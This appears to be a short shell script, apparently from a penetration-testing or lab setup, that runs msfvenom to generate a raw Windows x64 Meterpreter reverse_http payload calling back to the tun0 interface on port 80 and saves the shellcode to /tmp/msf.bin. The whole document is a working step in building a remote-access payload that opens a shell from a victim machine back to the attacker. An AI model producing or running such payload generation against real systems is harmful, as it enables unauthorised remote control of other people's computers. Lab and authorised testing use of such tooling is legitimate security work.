#!/bin/sh
msfvenom -p windows/x64/meterpreter/reverse_http --platform windows LHOST=tun0 LPORT=80 LURI=/MSF/ EXITFUNC=thread -f raw -o /tmp/msf.bin
